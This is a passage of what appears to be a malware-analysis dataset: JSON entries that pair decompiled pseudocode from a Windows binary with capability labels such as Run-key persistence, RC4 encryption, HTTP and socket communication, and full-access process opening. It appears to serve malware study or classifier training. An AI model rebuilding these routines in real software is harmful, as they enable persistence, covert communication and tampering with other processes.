(*arg_8h[10])(iVar3);\n        (*arg_8h[0xb])(iVar3);\n        (*arg_8h[8])(0);\n    }\n    while( true ) {\n        (*arg_8h[7])(0);\n        uVar1 = (*arg_8h[0xd])(0, 0, arg_8h[0x17]);\n        iVar3 = (*arg_8h[4])();\n        if (iVar3 != 0xb7) break;\n        (*arg_8h[0xb])(uVar1);\n        (*arg_8h[3])(500);\n    }\n    (*arg_8h[0xb])(uVar1);\n    do {\n        while( true ) {\n            var_44h = 0x44;\n            iVar3 = (*arg_8h[5])(0, arg_8h[0x1d], 0, 0, 0, 0, 0, 0, &var_44h, &var_54h);\n            if (iVar3 != 0) break;\n            (*arg_8h[3])(2000);\n        }\n        iVar3 = 0;\n        do {\n            iVar4 = (*arg_8h[6])(var_54h, 200);\n            if (iVar4 == 0) {\n                iVar3 = -1;\n            }\n        } while (iVar3 == 0);\n    } while( true );\n}\n",
        "token_count": 1186
    },
    "004754ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "link function at runtime on Windows",
            "link many functions at runtime"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004754ec(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack252;\n    uint uStack248;\n    uchar *puStack244;\n    uint var_e0h;\n    uint var_d8h;\n    uint var_d0h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_8ch;\n    uint uStack140;\n    uint uStack136;\n    uint uStack132;\n    uint uStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack244 = 0x475509;\n    var_8h = param_2;\n    fcn.004059cc();\n    puStack244 = 0x475511;\n    fcn.004059cc();\n    puStack244 = 0x475519;\n    fcn.004059cc();\n    uStack248 = 0x475851;\n    uStack252 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff04;\n    puStack244 = &stack0xfffffffc;\n    fcn.00403af4();\n    var_d0h = 0x44;\n    var_a4h = 1;\n    var_a0h._0_2_ = 0;\n    cVar1 = fcn.0040a274();\n    if (cVar1 == '\\0') {\n        fcn.004055c8();\n    }\n    cVar1 = fcn.0040a274();\n    if (cVar1 == '\\0') {\n        fcn.0040f23c();\n    }\n    uVar2 = fcn.004059dc(0, 0, 0, 0x8000000, 0, 0, &fcn.004754ec::var_d0h, &fcn.004754ec::var_e0h);\n    sub.kernel32.dll_CreateProcessA(0, uVar2);\n    uStack88 = fcn.00474d80();\n    uStack84 = fcn.00474d80();\n    uStack80 = fcn.00474d80();\n    uStack76 = fcn.00474d80();\n    uStack60 = fcn.00474d80();\n    uStack72 = fcn.00474d80();\n    uStack68 = fcn.00474d80();\n    uStack64 = fcn.00474d80();\n    uStack48 = fcn.00474d80();\n    uStack44 = fcn.00474d80();\n    uStack32 = fcn.00474d80();\n    uStack24 = fcn.00474d80();\n    uStack36 = fcn.00474d80();\n    uStack40 = fcn.00474d80();\n    fcn.004059dc();\n    uStack52 = fcn.00474d80();\n    uStack56 = fcn.00474d80();\n    fcn.004059dc();\n    uStack28 = fcn.00474d80();\n    uStack20 = var_d8h;\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x47595c, 0x47594c);\n    var_8ch = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x47595c, 0x475968);\n    uStack140 = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x47595c, 0x475898);\n    uStack132 = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x475978, 0x4758a0);\n    uStack136 = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x47595c, 0x4758ec);\n    uStack100 = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x47595c, 0x4758ac);\n    uStack124 = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x47595c, 0x4758bc);\n    uStack128 = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x47595c, 0x4758cc);\n    uStack116 = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x47595c, 0x4758dc);\n    uStack92 = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x47595c, 0x475924);\n    uStack96 = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x47595c, 0x4758f8);\n    uStack112 = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x47595c, 0x475910);\n    uStack104 = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x47595c, 0x475938);\n    uStack120 = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x47595c, 0x475904);\n    uStack108 = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = 0;\n    fcn.00474e48(0, 0x80);\n    *in_FS_OFFSET = uVar2;\n    fcn.00405554(0x475858);\n    return;\n}\n",
        "token_count": 1552
    },
    "004803ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004803ac(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack408;\n    uint uStack404;\n    uchar *puStack400;\n    uint uStack396;\n    uint uStack392;\n    uchar *puStack388;\n    uint var_170h;\n    uint var_16ch;\n    uint var_168h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_4h;\n    \n    puStack400 = &stack0xfffffffc;\n    puStack388 = 0x4803c3;\n    fcn.004059cc();\n    puStack388 = 0x4803d4;\n    fcn.00405fe8();\n    uStack392 = 0x4804a3;\n    uStack396 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe74;\n    uStack404 = 0x48045e;\n    uStack408 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe68;\n    puStack388 = &stack0xfffffffc;\n    fcn.0040a490();\n    fcn.0040a504();\n    *in_FS_OFFSET = uStack408;\n    *in_FS_OFFSET = uStack396;\n    puStack388 = 0x4804aa;\n    uStack392 = 0x48049a;\n    fcn.004060ac();\n    uStack392 = 0x4804a2;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 330
    },
    "00480960": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00480960(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_1ch;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    uStack56 = 0x480a13;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    iVar2 = (**(**(in_EAX + 0x40) + 0x14))();\n    if ((0 < iVar2) && (iVar2 = (**(**(in_EAX + 0x40) + 0x14))(),  -1 < iVar2 + -1)) {\n        do {\n            (**(**(in_EAX + 0x40) + 0xc))();\n            cVar1 = fcn.0040a274();\n            if (cVar1 != '\\0') {\n                fcn.004803ac();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    *in_FS_OFFSET = uStack60;\n    puStack52 = 0x480a1a;\n    uStack56 = 0x480a12;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 336
    },
    "00481114": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00481114(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack404;\n    uint uStack400;\n    uchar *puStack396;\n    uint uStack392;\n    uint uStack388;\n    uchar *puStack384;\n    uint var_16ch;\n    uint var_168h;\n    uint var_154h;\n    uint var_4h;\n    \n    puStack396 = &stack0xfffffffc;\n    puStack384 = 0x481135;\n    fcn.004059cc();\n    puStack384 = 0x481146;\n    fcn.00405fe8();\n    uStack388 = 0x481213;\n    uStack392 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe78;\n    uStack400 = 0x4811d0;\n    uStack404 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe6c;\n    puStack384 = &stack0xfffffffc;\n    fcn.00405864();\n    iVar1 = fcn.0040a490();\n    while (iVar1 == 0) {\n        uStack404 = 0x48123c;\n        fcn.004058e0();\n        iVar1 = fcn.0040a4e0();\n    }\n    fcn.0040a504();\n    *in_FS_OFFSET = uStack404;\n    *in_FS_OFFSET = uStack392;\n    puStack384 = 0x48121a;\n    uStack388 = 0x4811f9;\n    fcn.00405530();\n    uStack388 = 0x48120a;\n    fcn.004060ac();\n    uStack388 = 0x481212;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 396
    },
    "004813a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: var_4ch\n// WARNING: Variable defined which should be unmapped: var_48h\n// WARNING: Variable defined which should be unmapped: var_50h\n// WARNING: Variable defined which should be unmapped: var_54h\n// WARNING: Variable defined which should be unmapped: var_58h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_2ch\n\nvoid fcn.004813a4(void)\n\n{\n    uint arg_8h;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    float10 fVar2;\n    uint uVar3;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uchar auStack20 [2];\n    uchar *var_eh;\n    uint var_8h;\n    uint var_4h;\n    \n    *0x10 = &stack0xfffffffc;\n    iVar1 = 0xb;\n    do {\n        var_4h = 0;\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    _auStack20 = 0x481553;\n    var_14h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_14h;\n    fVar2 = fcn.0040bd00();\n    var_1ch = SUB84(fVar2, 0);\n    var_18h = fVar2 >> 0x20;\n    fcn.0040b908(&var_8h, var_1ch, var_18h);\n    fVar2 = fcn.0040bd00();\n    var_28h = SUB84(fVar2, 0);\n    var_24h = fVar2 >> 0x20;\n    fcn.0040bbe8(var_28h, var_24h);\n    fcn.00473610();\n    arg_8h = var_14h;\n    fcn.00473610();\n    fcn.00473610(var_18h);\n    fcn.00473610(var_1ch);\n    fcn.00473474(arg_8h);\n    fcn.00473610();\n    fcn.0048d6c4(var_28h);\n    fcn.00409d78(arg_8h);\n    fcn.00409d78(0x4815b8, var_28h);\n    fcn.00409d78(0x4815b8, arg_8h);\n    fcn.00409d78(0x4815c4, var_28h);\n    fcn.00409d78(0x4815b8);\n    fcn.00409d78(arg_8h);\n    fcn.00409d78(0x4815b8);\n    fcn.00409d78(var_28h);\n    fcn.004058e0(0x4815d0, 0x4815c4);\n    fcn.0048b61c(var_24h);\n    uVar3 = 0x4815e0;\n    fcn.00480fd8(0x4815e0, arg_8h);\n    fcn.004058e0(0x4815b8);\n    fcn.00473588();\n    fcn.00473568();\n    *in_FS_OFFSET = uVar3;\n    fcn.00405554(0x48155a);\n    return;\n}\n",
        "token_count": 1041
    },
    "004825f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004825f0 noreturn (uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    var_1ch = 0;\n    var_4h = 0;\n    uStack52 = 0x482725;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack56;\n    fcn.00405728();\n    fcn.00405b28(&var_1ch);\n    fcn.00405a44();\n    fcn.004059dc();\n    fcn.00405b28();\n    fcn.00405a84();\n    _var_18h = fcn.0040b748();\n    if (_var_18h == *0x482740) {\n        _var_18h = CONCAT28(0x4020, 0x9502f8ffc0000000);\n    }\n    _var_18h = _var_18h * *0x482744;\n    do {\n        sub.kernel32.dll_Sleep_2(100);\n        sub.kernel32.dll_CreateThread_1();\n        _var_18h = _var_18h - *0x482748;\n    } while (*0x482740 < _var_18h);\n    fcn.0048d6c4();\n    fcn.00405864();\n    fcn.00475d98();\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread_1(0);\n}\n",
        "token_count": 422
    },
    "00482a94": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00482a94 noreturn (uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    var_1ch = 0;\n    var_4h = 0;\n    uStack52 = 0x482bc9;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack56;\n    fcn.00405728();\n    fcn.00405b28(&var_1ch);\n    fcn.00405a44();\n    fcn.004059dc();\n    fcn.00405b28();\n    fcn.00405a84();\n    _var_18h = fcn.0040b748();\n    if (_var_18h == *0x482be4) {\n        _var_18h = CONCAT28(0x4020, 0x9502f8ffc0000000);\n    }\n    _var_18h = _var_18h * *0x482be8;\n    do {\n        sub.kernel32.dll_Sleep_2(100);\n        sub.kernel32.dll_CreateThread_1();\n        _var_18h = _var_18h - *0x482bec;\n    } while (*0x482be4 < _var_18h);\n    fcn.0048d6c4();\n    fcn.00405864();\n    fcn.00475d98();\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread_1(0);\n}\n",
        "token_count": 426
    },
    "00482f10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create thread"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00482f10(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = 0x482f29;\n    fcn.004059cc();\n    uStack36 = 0x482f82;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    iVar1 = sub.kernel32.dll_LocalAlloc_1(0x40, 0xc);\n    fcn.00405584();\n    *(iVar1 + 4) = param_2;\n    *(iVar1 + 8) = var_8h;\n    uVar2 = 0;\n    sub.kernel32.dll_CreateThread_1(0, 0, fcn.00482e04, iVar1, 0, &fcn.00482f10::var_ch);\n    *in_FS_OFFSET = uVar2;\n    fcn.00405530(0x482f89);\n    return;\n}\n",
        "token_count": 279
    },
    "00482fac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00482fac noreturn (uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uchar uVar3;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint var_14h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    var_4h = 0;\n    puStack48 = 0x482fce;\n    fcn.00405fe8();\n    uStack52 = 0x4830cc;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    uStack64 = 0x483085;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack48 = &stack0xfffffffc;\n    fcn.00408568();\n    fcn.004055c8();\n    uVar1 = fcn.004059dc();\n    var_14h = sub.wsock32.dll_inet_addr(uVar1);\n    iVar2 = sub.wsock32.dll_gethostbyaddr(&fcn.00482fac::var_14h, 4, 2);\n    uVar3 = iVar2 == 0;\n    if (!uVar3) {\n        fcn.0040aab0(0x4830e4, var_4h, *0x49b394);\n        fcn.004058e0(0x4830f0, 0);\n    }\n    fcn.00405974();\n    if (uVar3) {\n        *0x495788 = 0;\n        *0x495784 = 1;\n    }\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread_1(0);\n}\n",
        "token_count": 441
    },
    "0048344c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "persist via Run registry key"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0048344c(uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uchar uVar1;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    puStack36 = 0x48346b;\n    fcn.004059cc();\n    puStack36 = 0x483473;\n    fcn.004059cc();\n    puStack36 = 0x48347b;\n    fcn.004059cc();\n    puStack36 = 0x483483;\n    fcn.004059cc();\n    uStack40 = 0x483579;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    uVar1 = 1;\n    uStack52 = 0x483545;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack36 = &stack0xfffffffc;\n    fcn.004216b4();\n    fcn.00405974();\n    fcn.00405974();\n    fcn.00405974();\n    if (uVar1) {\n        fcn.004055c8();\n    }\n    fcn.00405974();\n    if (uVar1) {\n        fcn.004055c8();\n    }\n    fcn.0042174c();\n    fcn.00421890();\n    fcn.00421fb4();\n    fcn.00404650();\n    *in_FS_OFFSET = uStack56;\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x483580;\n    uStack40 = 0x483570;\n    fcn.00405554();\n    uStack40 = 0x483578;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 458
    },
    "00483f84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create HTTP request",
            "connect to URL"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004840d1)\n\nvoid __cdecl fcn.00483f84(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint uVar3;\n    uint uVar4;\n    uint uStack1136;\n    uint uStack1132;\n    uchar *puStack1128;\n    uint uStack1124;\n    uint uStack1120;\n    uint uStack1116;\n    uint uStack1112;\n    uint uStack1108;\n    uint uStack1104;\n    uint uStack1100;\n    uchar *puStack1096;\n    uint uStack1092;\n    uint uStack1088;\n    uchar *puStack1084;\n    uint var_428h;\n    uint var_424h;\n    uint var_420h;\n    uint var_41ch;\n    uint var_418h;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack1096 = &stack0xfffffffc;\n    puStack1084 = 0x483fbe;\n    fcn.00405fe8();\n    uStack1088 = 0x48414c;\n    uStack1092 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffbbc;\n    uStack1100 = 0x4840db;\n    uStack1104 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffbb0;\n    uStack1108 = 0x483fe9;\n    puStack1084 = &stack0xfffffffc;\n    fcn.00408568();\n    uStack1108 = 0x483ff3;\n    fcn.004055c8();\n    arg_8h_00 = *(arg_8h + 4);\n    uStack1108 = 0x48401b;\n    fcn.00403af4();\n    uStack1108 = 0;\n    uStack1112 = 0;\n    uStack1116 = 0;\n    uStack1120 = 0;\n    uStack1124 = 0x48415c;\n    puStack1128 = 0x48402d;\n    uVar1 = sub.wininet.dll_InternetOpenA();\n    uStack1132 = 0x4840c1;\n    uStack1136 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffb90;\n    puStack1128 = &stack0xfffffffc;\n    uVar2 = fcn.004059dc(0, 0, 0, 0);\n    uVar2 = sub.wininet.dll_InternetOpenUrlA(uVar1, uVar2);\n    sub.wininet.dll_InternetCloseHandle();\n    *in_FS_OFFSET = uVar2;\n    sub.wininet.dll_InternetCloseHandle(uVar1, 0x4840c8);\n    uVar4 = 0x484170;\n    uVar3 = 0;\n    uVar2 = 0x4841a0;\n    uVar1 = 0;\n    fcn.00409e64(arg_8h_00);\n    fcn.004058e0(0x4841ac, 0, arg_8h_00, uVar1, uVar2, uVar3, uVar4);\n    fcn.00475d98();\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread_1(0);\n}\n",
        "token_count": 789
    },
    "00484334": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00484334 noreturn (uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    var_1ch = 0;\n    var_4h = 0;\n    uStack52 = 0x484469;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack56;\n    fcn.00405728();\n    fcn.00405b28(&var_1ch);\n    fcn.00405a44();\n    fcn.004059dc();\n    fcn.00405b28();\n    fcn.00405a84();\n    _var_18h = fcn.0040b748();\n    if (_var_18h == *0x484484) {\n        _var_18h = CONCAT28(0x4020, 0x9502f8ffc0000000);\n    }\n    _var_18h = _var_18h * *0x484488;\n    do {\n        sub.kernel32.dll_Sleep_2(100);\n        sub.kernel32.dll_CreateThread_1();\n        _var_18h = _var_18h - *0x48448c;\n    } while (*0x484484 < _var_18h);\n    fcn.0048d6c4();\n    fcn.00405864();\n    fcn.00475d98();\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread_1(0);\n}\n",
        "token_count": 422
    },
    "00484b24": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "open process"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00484b24(uint param_1, uint *param_2)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint hObject;\n    uint var_4h;\n    \n    uStack32 = 0x484b3e;\n    puVar1 = fcn.00402f00();\n    *puVar1 = 0x28;\n    uStack36 = 0;\n    uStack40 = 0x1f0fff;\n    puStack44 = 0x484b52;\n    uVar2 = sub.kernel32.dll_OpenProcess();\n    uStack48 = 0x484ba0;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack44 = &stack0xfffffffc;\n    iVar3 = fcn.00461100();\n    if (iVar3 == 0) {\n        *param_2 = 0;\n    }\n    else {\n        *param_2 = puVar1[3];\n    }\n    fcn.00402f1c();\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x484ba7;\n    uStack52 = 0x484b9f;\n    uStack48 = uVar2;\n    sub.kernel32.dll_CloseHandle_1();\n    return;\n}\n",
        "token_count": 343
    },
    "00485198": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00485198(void)\n\n{\n    uint *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffea0;\n    uint uStack340;\n    uint uStack336;\n    uchar *puStack332;\n    uint uStack328;\n    uint uStack324;\n    uchar *puStack320;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint hObject;\n    \n    puStack320 = &stack0xfffffffc;\n    uStack324 = 0x4852a6;\n    uStack328 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffeb8;\n    puStack332 = 0x4851d6;\n    uVar1 = fcn.00460cc4();\n    uStack336 = 0x485281;\n    uStack340 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffeac;\n    puStack332 = &stack0xfffffffc;\n    iVar2 = fcn.00460ce4();\n    if (iVar2 == 0) {\n        fcn.00405530();\n    }\n    else {\n        fcn.00484f80(*in_EAX);\n        in_stack_fffffea0 = 0x4852bc;\n        fcn.004058e0(0x4852bc, 0);\n        while (iVar2 = fcn.00460d04(),  iVar2 != 0) {\n            fcn.00484f80(*in_EAX);\n            in_stack_fffffea0 = 0x4852bc;\n            fcn.004058e0();\n        }\n    }\n    *in_FS_OFFSET = in_stack_fffffea0;\n    sub.kernel32.dll_CloseHandle_1(uVar1, 0x485288);\n    return;\n}\n",
        "token_count": 409
    },
    "00485ed0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "receive data",
            "send data on socket",
            "send data",
            "receive data on socket"
        ],
        "decompiled_code": "\nvoid fcn.00485ed0(void)\n\n{\n    int32_t in_EAX;\n    uchar *puVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    puStack40 = &stack0xfffffffc;\n    uStack32 = 0x486029;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    *(in_EAX + 0x124) = 1;\n    uStack44 = 0x486007;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack48;\n    fcn.0041be60();\n    fcn.0041b750(0, 0);\n    fcn.004676a0();\n    fcn.0041b750(0, 0);\n    do {\n        fcn.00403af4();\n        puVar1 = (**(**(in_EAX + 0x50) + 0xc))();\n        if (puVar1 == NULL) break;\n        uStack36 = 0;\n        uStack44 = 0x49b39c;\n        uStack48 = *(in_EAX + 0x44);\n        puStack40 = puVar1;\n        sub.wsock32.dll_send();\n        sub.wsock32.dll_recv(*(in_EAX + 0x44), 0x49b39c, 0x2001, 0);\n    } while (puVar1 != NULL);\n    fcn.00409d78();\n    fcn.00405864();\n    fcn.00475ed4();\n    uVar2 = *(in_EAX + 0x44);\n    sub.wsock32.dll_recv(uVar2, 0x49b39c, 0x2001, 0);\n    fcn.0041be60();\n    *in_FS_OFFSET = uVar2;\n    *(in_EAX + 0x124) = 0;\n    return;\n}\n",
        "token_count": 502
    },
    "004860c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create thread"
        ],
